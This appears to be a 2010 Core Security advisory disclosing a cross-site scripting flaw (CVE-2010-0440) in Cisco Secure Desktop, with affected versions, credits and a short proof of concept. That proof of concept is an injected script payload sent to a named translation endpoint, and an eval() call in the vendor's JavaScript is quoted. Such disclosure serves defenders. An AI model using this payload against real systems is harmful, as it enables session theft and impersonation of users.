Cisco Secure Desktop XSS/JavaScript Injection



1. *Advisory Information*

Title: Cisco Secure Desktop XSS/JavaScript Injection
Advisory Id: CORE-2010-0106
Advisory URL: http://www.coresecurity.com/content/cisco-secure-desktop-xss
Date published: 2010-02-01
Date of last update: 2010-02-01
Vendors contacted: Cisco
Release mode: Coordinated release



2. *Vulnerability Information*

Class: Cross site scripting [CWE-79]
Impact: Code execution
Remotely Exploitable: Yes
Locally Exploitable: No
Bugtraq ID: 37960
CVE Name: CVE-2010-0440



3. *Vulnerability Description*

The Cisco Secure Desktop web application does not sufficiently verify if
a well-formed request was provided by the user who submitted the POST
request, resulting in a cross-site scripting vulnerability.

In order to be able to sucessfully make the attack, the Secure Desktop
application on the Cisco Appliance must be turned on.


4. *Vulnerable packages*

   . Cisco Secure Desktop 3.4.2048
   . Older versions are probably affected too, but they were not checked.


5. *Non-vulnerable packages*

   . Cisco Secure Desktop 3.5.841


6. *Vendor Information, Solutions and Workarounds*

Cisco Security Alert:
http://tools.cisco.com/security/center/viewAlert.x?alertId=19843


7. *Credits*

This vulnerability was discovered and researched by Matias Pablo Brutti
from Core Security Technologies.

The publication of this advisory was coordinated by Jorge Lucangeli Obes
from Core Security Technologies Advisories Team.


8. *Technical Description / Proof of Concept Code*

Cross-site scripting (XSS) vulnerabilities allow an attacker to execute
arbitrary scripting code in the context of the user browser (in the
vulnerable application's domain). For example, an attacker could exploit
an XSS vulnerability to steal user cookies (and then impersonate the
legitimate user) or fake a page requesting information to the user
(i.e.: credentials). This vulnerability occurs when user-supplied data
is displayed without encoding.

The Cisco Secure Desktop web application does not sufficiently verify if
a well-formed request was provided by the user who submitted the POST
request. The cross-site scripting vulnerability was found in the
following file/url:

/-----
https://{IP}//+CSCOT+/translation?textdomain=csd&prefix=trans&lang=en-us

- -----/
 Using the POST variable:

/-----
Starting, please wait..."><script>alert(1);</script>

- -----/
 The content of the POST field is not being encoded at the time of using
them in HTML output, therefore allowing an attacker who controls their
content to insert JavaScript code. Furthermore, we could possibly inject
JavaScript code into the 'start.html' page because the content of the
previously mentioned POST is used in 'binary/mainv.js' as input for an
'eval()' function, hence allowing an attacker to inject any code without
restrictions which will be executed in the context of the 'eval()'
function:

/-----
282            http_request.open('POST', path, false);
283            http_request.send(msgs);
284            var trans = new Array();
285            try {
286                eval(http_request.responseText);
287            } catch (e) {}
